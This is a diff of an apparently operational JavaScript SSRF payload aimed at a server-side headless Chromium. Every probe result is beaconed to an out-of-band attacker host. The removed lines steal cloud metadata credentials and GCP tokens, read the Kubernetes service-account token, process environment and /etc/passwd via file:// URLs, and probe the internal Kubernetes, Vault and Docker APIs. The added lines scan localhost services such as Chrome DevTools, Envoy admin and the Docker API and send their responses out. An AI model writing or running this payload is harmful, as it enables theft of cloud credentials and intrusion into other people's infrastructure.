@@ -8,91 +8,57 @@ function fire(path) {
   new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
 }
 
-fire('/alive5?t=0');
+fire('/alive6?t=0');
 
-// 1. WebRTC - внутренний IP Chromium-сервиса (с STUN для host-candidate)
-(function() {
-  try {
-    var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
-    pc.createDataChannel('x');
-    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
-    pc.onicecandidate = function(ev) {
-      if (!ev || !ev.candidate) return;
-      var m = (ev.candidate.candidate || '').match(/\b(\d{1,3}\.){3}\d{1,3}\b/g) || [];
-      m.forEach(function(ip) { fire('/rtc?ip=' + encodeURIComponent(ip)); });
-    };
-  } catch(e) { fire('/rtc-err?e=' + encodeURIComponent(e.message.slice(0, 80))); }
-})();
+// Сканирование localhost-портов Chromium-пода
+// Таймаут 5000мс чтобы дать сервисам время ответить
+// Ключевые цели:
+//   9222 - Chrome DevTools Protocol (jackpot!)
+//   15000 - Envoy admin
+//   15090 - Envoy Prometheus metrics
+//   8080, 3000, 5000 - типичные app-порты
 
-// 2. IMDS с таймаутом 2000мс - читаем тело ответа
-var imdsTargets = [
-  ['imds-root',  'http://169.254.169.254/'],
-  ['imds-meta',  'http://169.254.169.254/latest/meta-data/'],
-  ['imds-iam',   'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
-  ['imds-iid',   'http://169.254.169.254/latest/dynamic/instance-identity/document'],
-  ['gcp-proj',   'http://metadata.google.internal/computeMetadata/v1/project/project-id'],
-  ['gcp-token',  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'],
+var localPorts = [
+  ['cdp-9222',    'http://127.0.0.1:9222/json'],          // Chrome DevTools - список вкладок
+  ['cdp-ver',     'http://127.0.0.1:9222/json/version'],  // Chrome DevTools version
+  ['envoy-admin', 'http://127.0.0.1:15000/'],             // Envoy admin
+  ['envoy-stats', 'http://127.0.0.1:15000/stats'],        // Envoy stats
+  ['envoy-cfg',   'http://127.0.0.1:15000/config_dump'],  // Envoy config
+  ['envoy-prom',  'http://127.0.0.1:15090/stats/prometheus'], // Envoy Prometheus
+  ['lo-80',       'http://127.0.0.1:80/'],
+  ['lo-8080',     'http://127.0.0.1:8080/'],
+  ['lo-8888',     'http://127.0.0.1:8888/'],
+  ['lo-3000',     'http://127.0.0.1:3000/'],
+  ['lo-5000',     'http://127.0.0.1:5000/'],
+  ['lo-4000',     'http://127.0.0.1:4000/'],
+  ['lo-9090',     'http://127.0.0.1:9090/api/v1/status/buildinfo'],
+  ['lo-9100',     'http://127.0.0.1:9100/metrics'],       // node_exporter
+  ['lo-6379',     'http://127.0.0.1:6379/'],              // Redis
+  ['lo-5601',     'http://127.0.0.1:5601/'],              // Kibana
+  ['lo-2375',     'http://127.0.0.1:2375/version'],       // Docker API
+  ['lo-9229',     'http://127.0.0.1:9229/json'],          // Node.js inspector
+  ['lo-4040',     'http://127.0.0.1:4040/'],              // Spark
+  ['lo-7000',     'http://127.0.0.1:7000/'],
+  ['lo-9333',     'http://127.0.0.1:9333/json'],          // Chrome debug alt
+  ['lo-50051',    'http://127.0.0.1:50051/'],             // gRPC
 ];
 
-imdsTargets.forEach(function(t) {
+localPorts.forEach(function(t) {
   var label = t[0], url = t[1], t0 = Date.now();
-  fetch(url, {signal: AbortSignal.timeout(2000)})
+  fetch(url, {signal: AbortSignal.timeout(5000)})
     .then(function(r) {
       return r.text().then(function(body) {
-        fire('/ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
+        fire('/lo-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
       });
     })
     .catch(function(e) {
-      fire('/err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
-    });
-});
-
-// 3. file:// - k8s service account token и системные файлы
-var fileTargets = [
-  ['sa-token',   'file:///var/run/secrets/kubernetes.io/serviceaccount/token'],
-  ['sa-ns',      'file:///var/run/secrets/kubernetes.io/serviceaccount/namespace'],
-  ['proc-env',   'file:///proc/self/environ'],
-  ['etc-hosts',  'file:///etc/hosts'],
-  ['resolv',     'file:///etc/resolv.conf'],
-  ['passwd',     'file:///etc/passwd'],
-  ['proc-net',   'file:///proc/net/fib_trie'],
-];
-
-fileTargets.forEach(function(t) {
-  var label = t[0], url = t[1], t0 = Date.now();
-  fetch(url)
-    .then(function(r) {
-      return r.text().then(function(body) {
-        fire('/file-ok-' + label + '?ms=' + (Date.now()-t0) + '&d=' + encodeURIComponent(body.slice(0, 500)));
-      });
-    })
-    .catch(function(e) {
-      fire('/file-err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
-    });
-});
-
-// 4. k8s API и внутренние сервисы - 2000мс таймаут
-var k8sTargets = [
-  ['k8s-version', 'https://10.96.0.1/version'],
-  ['k8s-healthz', 'https://10.96.0.1/healthz'],
-  ['k8s-apis',    'https://10.96.0.1/apis'],
-  ['etcd',        'http://10.96.0.1:2379/health'],
-  ['consul',      'http://10.96.0.1:8500/v1/catalog/services'],
-  ['vault',       'http://10.96.0.1:8200/v1/sys/health'],
-  ['prom',        'http://10.96.0.1:9090/api/v1/status/buildinfo'],
-  ['docker',      'http://172.17.0.1:2375/version'],
-];
-
-k8sTargets.forEach(function(t) {
-  var label = t[0], url = t[1], t0 = Date.now();
-  fetch(url, {signal: AbortSignal.timeout(2000)})
-    .then(function(r) {
-      return r.text().then(function(body) {
-        fire('/k8s-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
-      });
-    })
-    .catch(function(e) {
-      fire('/k8s-err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
+      var ms = Date.now() - t0;
+      // Только успехи и быстрые ответы - не шлём 5000мс таймауты (слишком много)
+      if (ms < 4900 || e.message.indexOf('timed') === -1) {
+        fire('/lo-err-' + label + '?ms=' + ms + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
+      } else {
+        fire('/lo-to-' + label + '?ms=' + ms);
+      }
     });
 });
 </script>
